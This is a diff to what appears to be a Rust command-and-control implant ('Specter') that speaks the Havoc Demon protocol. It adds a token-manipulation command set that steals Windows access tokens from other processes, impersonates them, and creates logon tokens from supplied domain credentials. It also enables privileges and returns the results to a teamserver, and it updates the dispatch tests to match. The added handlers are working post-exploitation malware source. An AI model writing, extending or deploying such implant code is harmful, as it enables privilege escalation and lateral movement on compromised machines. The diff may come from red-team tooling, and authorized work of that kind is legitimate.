@@ -16,10 +16,12 @@ use std::time::UNIX_EPOCH;
 
 use red_cell_common::demon::{
     DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage, DemonProcessCommand,
+    DemonTokenCommand,
 };
 use tracing::{info, warn};
 
 use crate::config::SpecterConfig;
+use crate::token::TokenVault;
 
 // ─── Result type ─────────────────────────────────────────────────────────────
 
@@ -58,7 +60,11 @@ impl Response {
 ///
 /// The [`DispatchResult`] must be transmitted back to the server using the
 /// `request_id` from the original package.
-pub fn dispatch(package: &DemonPackage, config: &mut SpecterConfig) -> DispatchResult {
+pub fn dispatch(
+    package: &DemonPackage,
+    config: &mut SpecterConfig,
+    token_vault: &mut TokenVault,
+) -> DispatchResult {
     let cmd = match DemonCommand::try_from(package.command_id) {
         Ok(c) => c,
         Err(_) => {
@@ -76,6 +82,7 @@ pub fn dispatch(package: &DemonPackage, config: &mut SpecterConfig) -> DispatchR
         DemonCommand::CommandProc => handle_proc(&package.payload),
         DemonCommand::CommandProcList => handle_proc_list(&package.payload),
         DemonCommand::CommandNet => handle_net(&package.payload),
+        DemonCommand::CommandToken => handle_token(&package.payload, token_vault),
         DemonCommand::CommandExit => DispatchResult::Exit,
         // These are agent-to-server callbacks; ignore if received from server.
         DemonCommand::CommandOutput | DemonCommand::BeaconOutput => DispatchResult::Ignore,
@@ -1451,6 +1458,438 @@ fn platform_users() -> Vec<NetUser> {
     users
 }
 
+// ─── COMMAND_TOKEN (40) ─────────────────────────────────────────────────────
+
+/// Dispatch a `CommandToken` task to the appropriate token sub-handler.
+///
+/// Incoming payload (LE): `[subcommand: u32][subcommand-specific args…]`
+fn handle_token(payload: &[u8], vault: &mut TokenVault) -> DispatchResult {
+    let mut offset = 0;
+    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("CommandToken: failed to parse subcommand: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let subcmd = match DemonTokenCommand::try_from(subcmd_raw) {
+        Ok(c) => c,
+        Err(_) => {
+            warn!(subcmd_raw, "CommandToken: unknown subcommand");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    info!(subcommand = ?subcmd, "CommandToken dispatch");
+
+    let rest = &payload[offset..];
+    match subcmd {
+        DemonTokenCommand::Impersonate => handle_token_impersonate(subcmd_raw, rest, vault),
+        DemonTokenCommand::Steal => handle_token_steal(subcmd_raw, rest, vault),
+        DemonTokenCommand::List => handle_token_list(subcmd_raw, vault),
+        DemonTokenCommand::PrivsGetOrList => handle_token_privs(subcmd_raw, rest),
+        DemonTokenCommand::Make => handle_token_make(subcmd_raw, rest, vault),
+        DemonTokenCommand::GetUid => handle_token_getuid(subcmd_raw),
+        DemonTokenCommand::Revert => handle_token_revert(subcmd_raw, vault),
+        DemonTokenCommand::Remove => handle_token_remove(subcmd_raw, rest, vault),
+        DemonTokenCommand::Clear => handle_token_clear(subcmd_raw, vault),
+        DemonTokenCommand::FindTokens => handle_token_find(subcmd_raw),
+    }
+}
+
+/// `COMMAND_TOKEN / Impersonate (1)` — impersonate a vault token by ID.
+///
+/// Incoming args (LE): `[token_id: u32]`
+/// Outgoing payload (LE): `[subcmd: u32][success: u32][domain_user: wstring]`
+fn handle_token_impersonate(
+    subcmd_raw: u32,
+    rest: &[u8],
+    vault: &mut TokenVault,
+) -> DispatchResult {
+    use crate::token::native;
+
+    let mut offset = 0;
+    let token_id = match parse_u32_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("Token::Impersonate: failed to parse token_id: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+
+    let entry = match vault.get(token_id) {
+        Some(e) => e,
+        None => {
+            info!(token_id, "Token::Impersonate: token not found in vault");
+            write_u32_le(&mut out, 0); // FALSE
+            write_u32_le(&mut out, 0); // empty string length
+            return DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out));
+        }
+    };
+
+    let handle = entry.handle;
+    let domain_user = entry.domain_user.clone();
+
+    match native::impersonate_token(handle) {
+        Ok(()) => {
+            vault.set_impersonating(Some(token_id));
+            info!(token_id, user = %domain_user, "Token::Impersonate: success");
+            write_u32_le(&mut out, 1); // TRUE
+            write_utf16le(&mut out, &domain_user);
+        }
+        Err(err) => {
+            warn!(token_id, error_code = err, "Token::Impersonate: failed");
+            write_u32_le(&mut out, 0); // FALSE
+            write_u32_le(&mut out, 0);
+        }
+    }
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
+}
+
+/// `COMMAND_TOKEN / Steal (2)` — steal a token from a target process.
+///
+/// Incoming args (LE): `[pid: u32][handle: u32]`
+/// Outgoing payload (LE): `[subcmd: u32][domain_user: wbytes][token_id: u32][pid: u32]`
+fn handle_token_steal(subcmd_raw: u32, rest: &[u8], vault: &mut TokenVault) -> DispatchResult {
+    use crate::token::native;
+
+    let mut offset = 0;
+    let target_pid = match parse_u32_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("Token::Steal: failed to parse pid: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+    let target_handle = match parse_u32_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("Token::Steal: failed to parse handle: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let entry = match native::steal_token(target_pid, target_handle) {
+        Ok(e) => e,
+        Err(err) => {
+            warn!(target_pid, error_code = err, "Token::Steal: failed");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let domain_user = entry.domain_user.clone();
+    let token_id = vault.add(entry);
+
+    // Auto-impersonate the stolen token.
+    if let Err(err) = native::impersonate_token(vault.get(token_id).map_or(0, |e| e.handle)) {
+        warn!(token_id, error_code = err, "Token::Steal: impersonate failed");
+    } else {
+        vault.set_impersonating(Some(token_id));
+    }
+
+    info!(token_id, user = %domain_user, pid = target_pid, "Token::Steal: success");
+
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+    // PackageAddBytes for domain_user (UTF-16LE).
+    write_utf16le(&mut out, &domain_user);
+    write_u32_le(&mut out, token_id);
+    write_u32_le(&mut out, target_pid);
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
+}
+
+/// `COMMAND_TOKEN / List (3)` — list all tokens in the vault.
+///
+/// Outgoing payload (LE): `[subcmd: u32]` then for each token:
+///   `[index: u32][handle: u32][domain_user: wstring][pid: u32][type: u32][impersonating: u32]`
+fn handle_token_list(subcmd_raw: u32, vault: &TokenVault) -> DispatchResult {
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+
+    for (idx, entry) in vault.iter() {
+        write_u32_le(&mut out, idx);
+        #[allow(clippy::cast_possible_truncation)]
+        write_u32_le(&mut out, entry.handle as u32);
+        write_utf16le(&mut out, &entry.domain_user);
+        write_u32_le(&mut out, entry.process_id);
+        write_u32_le(&mut out, entry.token_type as u32);
+        write_u32_le(&mut out, u32::from(vault.is_impersonating(idx)));
+    }
+
+    info!(count = vault.len(), "Token::List");
+    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
+}
+
+/// `COMMAND_TOKEN / PrivsGetOrList (4)` — get/list privileges on the current token.
+///
+/// Incoming args (LE): `[list_privs: u32]` then if `list_privs == 0`: `[priv_name: bytes]`
+/// Outgoing payload (LE): `[subcmd: u32][list_privs: u32]` then either:
+///   - List:  `[name: bytes][attrs: u32]...`
+///   - Get:   `[success: u32][name: bytes]`
+fn handle_token_privs(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
+    use crate::token::native;
+
+    let mut offset = 0;
+    let list_privs = match parse_u32_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("Token::PrivsGetOrList: failed to parse list_privs: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+    write_u32_le(&mut out, list_privs);
+
+    if list_privs != 0 {
+        // List all privileges.
+        match native::list_privileges() {
+            Ok(privs) => {
+                info!(count = privs.len(), "Token::PrivsList");
+                for (name, attrs) in &privs {
+                    write_bytes_le(&mut out, name.as_bytes());
+                    write_u32_le(&mut out, *attrs);
+                }
+            }
+            Err(err) => {
+                warn!(error_code = err, "Token::PrivsList: failed");
+            }
+        }
+    } else {
+        // Enable a specific privilege.
+        let priv_bytes = match parse_bytes_le(&rest[offset..], &mut 0) {
+            Ok(b) => b,
+            Err(e) => {
+                warn!("Token::PrivsGet: failed to parse priv name: {e}");
+                return DispatchResult::Ignore;
+            }
+        };
+        let priv_name = String::from_utf8_lossy(&priv_bytes).trim_end_matches('\0').to_string();
+
+        match native::enable_privilege(&priv_name) {
+            Ok(success) => {
+                info!(privilege = %priv_name, success, "Token::PrivsGet");
+                write_u32_le(&mut out, u32::from(success));
+                write_bytes_le(&mut out, priv_name.as_bytes());
+            }
+            Err(err) => {
+                warn!(privilege = %priv_name, error_code = err, "Token::PrivsGet: failed");
+                write_u32_le(&mut out, 0);
+                write_bytes_le(&mut out, priv_name.as_bytes());
+            }
+        }
+    }
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
+}
+
+/// `COMMAND_TOKEN / Make (5)` — create a token via `LogonUserW`.
+///
+/// Incoming args (LE): `[domain: wbytes][user: wbytes][password: wbytes][logon_type: u32]`
+/// Outgoing payload (LE): `[subcmd: u32][domain_user: wstring]`
+fn handle_token_make(subcmd_raw: u32, rest: &[u8], vault: &mut TokenVault) -> DispatchResult {
+    use crate::token::native;
+
+    let mut offset = 0;
+
+    let domain_bytes = match parse_bytes_le(rest, &mut offset) {
+        Ok(b) => b,
+        Err(e) => {
+            warn!("Token::Make: failed to parse domain: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+    let user_bytes = match parse_bytes_le(rest, &mut offset) {
+        Ok(b) => b,
+        Err(e) => {
+            warn!("Token::Make: failed to parse user: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+    let password_bytes = match parse_bytes_le(rest, &mut offset) {
+        Ok(b) => b,
+        Err(e) => {
+            warn!("Token::Make: failed to parse password: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+    let logon_type = match parse_u32_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("Token::Make: failed to parse logon_type: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let domain = decode_utf16le_null(&domain_bytes);
+    let user = decode_utf16le_null(&user_bytes);
+    let password = decode_utf16le_null(&password_bytes);
+
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+
+    match native::make_token(&domain, &user, &password, logon_type) {
+        Ok(entry) => {
+            let domain_user = entry.domain_user.clone();
+            let token_id = vault.add(entry);
+
+            // Auto-impersonate the new token.
+            if let Err(err) = native::impersonate_token(vault.get(token_id).map_or(0, |e| e.handle))
+            {
+                warn!(token_id, error_code = err, "Token::Make: impersonate failed");
+            } else {
+                vault.set_impersonating(Some(token_id));
+            }
+
+            info!(token_id, user = %domain_user, "Token::Make: success");
+            write_utf16le(&mut out, &domain_user);
+        }
+        Err(err) => {
+            warn!(error_code = err, "Token::Make: LogonUserW failed");
+            // Empty response — no user domain on failure.
+        }
+    }
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
+}
+
+/// `COMMAND_TOKEN / GetUid (6)` — query current identity and elevation status.
+///
+/// Outgoing payload (LE): `[subcmd: u32][elevated: u32][user: wbytes]`
+fn handle_token_getuid(subcmd_raw: u32) -> DispatchResult {
+    use crate::token::native;
+
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+
+    match native::get_uid() {
+        Ok((elevated, user)) => {
+            info!(user = %user, elevated, "Token::GetUid");
+            write_u32_le(&mut out, u32::from(elevated));
+            write_utf16le(&mut out, &user);
+        }
+        Err(err) => {
+            warn!(error_code = err, "Token::GetUid: failed");
+            write_u32_le(&mut out, 0);
+            write_bytes_le(&mut out, &[]);
+        }
+    }
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
+}
+
+/// `COMMAND_TOKEN / Revert (7)` — revert to original process token.
+///
+/// Outgoing payload (LE): `[subcmd: u32][success: u32]`
+fn handle_token_revert(subcmd_raw: u32, vault: &mut TokenVault) -> DispatchResult {
+    use crate::token::native;
+
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+
+    match native::revert_to_self() {
+        Ok(()) => {
+            vault.set_impersonating(None);
+            info!("Token::Revert: success");
+            write_u32_le(&mut out, 1); // TRUE
+        }
+        Err(err) => {
+            warn!(error_code = err, "Token::Revert: failed");
+            write_u32_le(&mut out, 0); // FALSE
+        }
+    }
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
+}
+
+/// `COMMAND_TOKEN / Remove (8)` — remove a token from the vault by ID.
+///
+/// Incoming args (LE): `[token_id: u32]`
+/// Outgoing payload (LE): `[subcmd: u32][success: u32][token_id: u32]`
+fn handle_token_remove(subcmd_raw: u32, rest: &[u8], vault: &mut TokenVault) -> DispatchResult {
+    use crate::token::native;
+
+    let mut offset = 0;
+    let token_id = match parse_u32_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("Token::Remove: failed to parse token_id: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    // Close the underlying handle before removing from vault.
+    if let Some(entry) = vault.get(token_id) {
+        native::close_token_handle(entry.handle);
+    }
+
+    let success = vault.remove(token_id);
+    info!(token_id, success, "Token::Remove");
+
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+    write_u32_le(&mut out, u32::from(success));
+    write_u32_le(&mut out, token_id);
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
+}
+
+/// `COMMAND_TOKEN / Clear (9)` — clear all tokens from the vault.
+///
+/// Outgoing payload (LE): `[subcmd: u32]`
+fn handle_token_clear(subcmd_raw: u32, vault: &mut TokenVault) -> DispatchResult {
+    use crate::token::native;
+
+    // Close all underlying handles.
+    for (_, entry) in vault.iter() {
+        native::close_token_handle(entry.handle);
+    }
+
+    // Revert impersonation before clearing.
+    let _ = native::revert_to_self();
+
+    vault.clear();
+    info!("Token::Clear");
+
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
+}
+
+/// `COMMAND_TOKEN / FindTokens (10)` — enumerate tokens available on the system.
+///
+/// This is a Windows-only advanced capability that scans the system handle table.
+/// On non-Windows platforms, it returns `success = 0`.
+///
+/// Outgoing payload (LE): `[subcmd: u32][success: u32]` then if success:
+///   `[count: u32]` then for each token:
+///   `[username: wstring][pid: u32][handle: u32][integrity: u32][impersonation: u32][token_type: u32]`
+fn handle_token_find(subcmd_raw: u32) -> DispatchResult {
+    // FindTokens requires NtQuerySystemInformation(SystemHandleInformation) which
+    // is not exposed through windows-sys.  For now, report not-supported so the
+    // teamserver knows the sub-command was received but the agent cannot fulfil it.
+    //
+    // A full implementation would iterate the system handle table, duplicate token
+    // handles from other processes, and query their metadata.  This will be added
+    // in a follow-up issue once the NT syscall wrappers are available.
+
+    info!("Token::FindTokens: not yet implemented — returning empty");
+
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+    write_u32_le(&mut out, 0); // success = FALSE
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
+}
+
 // ─── Payload parsing helpers (server → agent, little-endian) ─────────────────
 
 /// Parse a `u32` in little-endian byte order from `buf[*offset..]`.
@@ -1706,7 +2145,7 @@ mod tests {
         let mut config = SpecterConfig::default();
         let payload = le_u32_pair(3000, 25);
         let package = DemonPackage::new(DemonCommand::CommandSleep, 42, payload);
-        let result = dispatch(&package, &mut config);
+        let result = dispatch(&package, &mut config, &mut TokenVault::new());
 
         assert_eq!(config.sleep_delay_ms, 3000);
         assert_eq!(config.sleep_jitter, 25);
@@ -1727,7 +2166,7 @@ mod tests {
         let mut config = SpecterConfig::default();
         let payload = le_u32_pair(1000, 150); // jitter > 100
         let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
-        dispatch(&package, &mut config);
+        dispatch(&package, &mut config, &mut TokenVault::new());
         assert_eq!(config.sleep_jitter, 100);
     }
 
@@ -1735,7 +2174,7 @@ mod tests {
     fn handle_sleep_short_payload_returns_ignore() {
         let mut config = SpecterConfig::default();
         let package = DemonPackage::new(DemonCommand::CommandSleep, 1, vec![0x01]); // too short
-        let result = dispatch(&package, &mut config);
+        let result = dispatch(&package, &mut config, &mut TokenVault::new());
         assert!(matches!(result, DispatchResult::Ignore));
     }
 
@@ -1746,7 +2185,7 @@ mod tests {
         let mut config = SpecterConfig::default();
         let payload = le_subcmd(9); // GetPwd = 9
         let package = DemonPackage::new(DemonCommand::CommandFs, 7, payload);
-        let result = dispatch(&package, &mut config);
+        let result = dispatch(&package, &mut config, &mut TokenVault::new());
 
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond, got {result:?}");
@@ -1773,7 +2212,7 @@ mod tests {
         payload.extend_from_slice(&le_utf16le_payload(&tmp_str));
         let package = DemonPackage::new(DemonCommand::CommandFs, 8, payload);
 
-        let result = dispatch(&package, &mut config);
+        let result = dispatch(&package, &mut config, &mut TokenVault::new());
 
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond, got {result:?}");
@@ -1793,7 +2232,7 @@ mod tests {
         let mut config = SpecterConfig::default();
         let payload = le_subcmd(4); // Cd = 4, but no path bytes follow
         let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
-        let result = dispatch(&package, &mut config);
+        let result = dispatch(&package, &mut config, &mut TokenVault::new());
         assert!(matches!(result, DispatchResult::Ignore));
     }
 
@@ -1808,7 +2247,7 @@ mod tests {
         let payload = dir_request_payload(&tmp_str, false, false, false, false, "", "", "");
         let package = DemonPackage::new(DemonCommand::CommandFs, 9, payload);
 
-        let result = dispatch(&package, &mut config);
+        let result = dispatch(&package, &mut config, &mut TokenVault::new());
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
 
@@ -1825,7 +2264,8 @@ mod tests {
         let payload =
             dir_request_payload(&tmp.display().to_string(), false, false, false, true, "", "", "");
         let package = DemonPackage::new(DemonCommand::CommandFs, 11, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
 
@@ -1878,7 +2318,8 @@ mod tests {
         let payload =
             dir_request_payload(&tmp.display().to_string(), false, false, false, false, "", "", "");
         let package = DemonPackage::new(DemonCommand::CommandFs, 12, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
 
@@ -1951,7 +2392,7 @@ mod tests {
         payload.extend_from_slice(&0u32.to_le_bytes()); // verbose = false
 
         let package = DemonPackage::new(DemonCommand::CommandProc, 99, payload);
-        let result = dispatch(&package, &mut config);
+        let result = dispatch(&package, &mut config, &mut TokenVault::new());
 
         let DispatchResult::MultiRespond(resps) = result else {
             panic!("expected MultiRespond, got {result:?}");
@@ -1983,7 +2424,7 @@ mod tests {
         payload.extend_from_slice(&0u32.to_le_bytes()); // verbose
 
         let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
-        let result = dispatch(&package, &mut config);
+        let result = dispatch(&package, &mut config, &mut TokenVault::new());
 
         let DispatchResult::MultiRespond(resps) = result else {
             panic!("expected MultiRespond, got {result:?}");
@@ -2031,21 +2472,30 @@ mod tests {
     fn dispatch_unknown_command_id_returns_ignore() {
         let mut config = SpecterConfig::default();
         let package = DemonPackage { command_id: 0xDEAD_0000, request_id: 0, payload: vec![] };
-        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
+        assert!(matches!(
+            dispatch(&package, &mut config, &mut TokenVault::new()),
+            DispatchResult::Ignore
+        ));
     }
 
     #[test]
     fn dispatch_no_job_returns_ignore() {
         let mut config = SpecterConfig::default();
         let package = DemonPackage::new(DemonCommand::CommandNoJob, 0, vec![]);
-        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
+        assert!(matches!(
+            dispatch(&package, &mut config, &mut TokenVault::new()),
+            DispatchResult::Ignore
+        ));
     }
 
     #[test]
     fn dispatch_exit_returns_exit() {
         let mut config = SpecterConfig::default();
         let package = DemonPackage::new(DemonCommand::CommandExit, 0, vec![]);
-        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Exit));
+        assert!(matches!(
+            dispatch(&package, &mut config, &mut TokenVault::new()),
+            DispatchResult::Exit
+        ));
     }
 
     // ── write_ptr_be ─────────────────────────────────────────────────────────
@@ -2074,7 +2524,7 @@ mod tests {
         // process_ui = 0 (console request)
         let payload = 0u32.to_le_bytes().to_vec();
         let package = DemonPackage::new(DemonCommand::CommandProcList, 1, payload);
-        let result = dispatch(&package, &mut config);
+        let result = dispatch(&package, &mut config, &mut TokenVault::new());
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond, got {result:?}");
         };
@@ -2087,7 +2537,8 @@ mod tests {
         // process_ui = 1 (from process manager)
         let payload = 1u32.to_le_bytes().to_vec();
         let package = DemonPackage::new(DemonCommand::CommandProcList, 2, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         let echoed_ui = u32::from_le_bytes(resp.payload[0..4].try_into().expect("le u32"));
@@ -2099,7 +2550,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let payload = 0u32.to_le_bytes().to_vec();
         let package = DemonPackage::new(DemonCommand::CommandProcList, 3, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         // Payload must be > 4 bytes (the process_ui field) if any processes were enumerated.
@@ -2112,7 +2564,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let payload = 0u32.to_le_bytes().to_vec();
         let package = DemonPackage::new(DemonCommand::CommandProcList, 4, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         // Parse the response (LE): skip process_ui (4 bytes), then iterate entries.
@@ -2155,7 +2608,8 @@ mod tests {
         let mut payload = 2u32.to_le_bytes().to_vec(); // subcmd = Modules
         payload.extend_from_slice(&0u32.to_le_bytes()); // pid = 0
         let package = DemonPackage::new(DemonCommand::CommandProc, 10, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
@@ -2170,7 +2624,8 @@ mod tests {
         let mut payload = 2u32.to_le_bytes().to_vec();
         payload.extend_from_slice(&42u32.to_le_bytes()); // arbitrary pid
         let package = DemonPackage::new(DemonCommand::CommandProc, 11, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         let echoed_pid = u32::from_le_bytes(resp.payload[4..8].try_into().expect("pid"));
@@ -2185,7 +2640,8 @@ mod tests {
         let mut payload = 3u32.to_le_bytes().to_vec(); // subcmd = Grep
         payload.extend_from_slice(&le_utf16le_payload("nonexistent_xzy_proc_name_123"));
         let package = DemonPackage::new(DemonCommand::CommandProc, 20, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
@@ -2199,7 +2655,8 @@ mod tests {
         let mut payload = 3u32.to_le_bytes().to_vec();
         payload.extend_from_slice(&le_utf16le_payload("zzz_no_such_process_zzz_99999"));
         let package = DemonPackage::new(DemonCommand::CommandProc, 21, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         // Only the subcmd field (4 bytes); no process entries.
@@ -2212,7 +2669,7 @@ mod tests {
         // Only the subcmd, no name bytes
         let payload = 3u32.to_le_bytes().to_vec();
         let package = DemonPackage::new(DemonCommand::CommandProc, 22, payload);
-        let result = dispatch(&package, &mut config);
+        let result = dispatch(&package, &mut config, &mut TokenVault::new());
         assert!(matches!(result, DispatchResult::Ignore));
     }
 
@@ -2225,7 +2682,8 @@ mod tests {
         payload.extend_from_slice(&0u32.to_le_bytes()); // pid = 0
         payload.extend_from_slice(&0u32.to_le_bytes()); // filter = all
         let package = DemonPackage::new(DemonCommand::CommandProc, 30, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
@@ -2240,7 +2698,8 @@ mod tests {
         payload.extend_from_slice(&1234u32.to_le_bytes()); // pid
         payload.extend_from_slice(&0x04u32.to_le_bytes()); // PAGE_READWRITE filter
         let package = DemonPackage::new(DemonCommand::CommandProc, 31, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         let echoed_pid = u32::from_le_bytes(resp.payload[4..8].try_into().expect("pid"));
@@ -2257,7 +2716,8 @@ mod tests {
         payload.extend_from_slice(&own_pid.to_le_bytes()); // self
         payload.extend_from_slice(&0u32.to_le_bytes()); // all regions
         let package = DemonPackage::new(DemonCommand::CommandProc, 32, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         // Header is 12 bytes (subcmd + pid + filter); must have at least one region (20 bytes).
@@ -2273,7 +2733,10 @@ mod tests {
         let mut config = SpecterConfig::default();
         let payload = 6u32.to_le_bytes().to_vec(); // subcmd only, no pid
         let package = DemonPackage::new(DemonCommand::CommandProc, 33, payload);
-        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
+        assert!(matches!(
+            dispatch(&package, &mut config, &mut TokenVault::new()),
+            DispatchResult::Ignore
+        ));
     }
 
     // ── handle_proc_kill ─────────────────────────────────────────────────────
@@ -2284,7 +2747,8 @@ mod tests {
         let mut payload = 7u32.to_le_bytes().to_vec(); // subcmd = Kill
         payload.extend_from_slice(&9_999_999u32.to_le_bytes()); // bogus pid
         let package = DemonPackage::new(DemonCommand::CommandProc, 40, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
@@ -2300,7 +2764,10 @@ mod tests {
         let mut config = SpecterConfig::default();
         let payload = 7u32.to_le_bytes().to_vec(); // subcmd only, no pid
         let package = DemonPackage::new(DemonCommand::CommandProc, 41, payload);
-        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
+        assert!(matches!(
+            dispatch(&package, &mut config, &mut TokenVault::new()),
+            DispatchResult::Ignore
+        ));
     }
 
     #[test]
@@ -2310,7 +2777,8 @@ mod tests {
         let mut payload = 7u32.to_le_bytes().to_vec();
         payload.extend_from_slice(&1u32.to_le_bytes()); // pid=1 (init, will likely fail)
         let package = DemonPackage::new(DemonCommand::CommandProc, 42, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         assert_eq!(resp.payload.len(), 12, "kill response must be exactly 12 bytes");
@@ -2345,21 +2813,28 @@ mod tests {
         let mut config = SpecterConfig::default();
         let payload = 0xFFu32.to_le_bytes().to_vec();
         let package = DemonPackage::new(DemonCommand::CommandNet, 1, payload);
-        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
+        assert!(matches!(
+            dispatch(&package, &mut config, &mut TokenVault::new()),
+            DispatchResult::Ignore
+        ));
     }
 
     #[test]
     fn handle_net_empty_payload_returns_ignore() {
         let mut config = SpecterConfig::default();
         let package = DemonPackage::new(DemonCommand::CommandNet, 1, vec![]);
-        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
+        assert!(matches!(
+            dispatch(&package, &mut config, &mut TokenVault::new()),
+            DispatchResult::Ignore
+        ));
     }
 
     #[test]
     fn handle_net_domain_returns_correct_command_and_subcmd() {
         let mut config = SpecterConfig::default();
         let package = net_package(DemonNetCommand::Domain, &[]);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
@@ -2372,7 +2847,8 @@ mod tests {
     fn handle_net_domain_response_string_is_le_length_prefixed() {
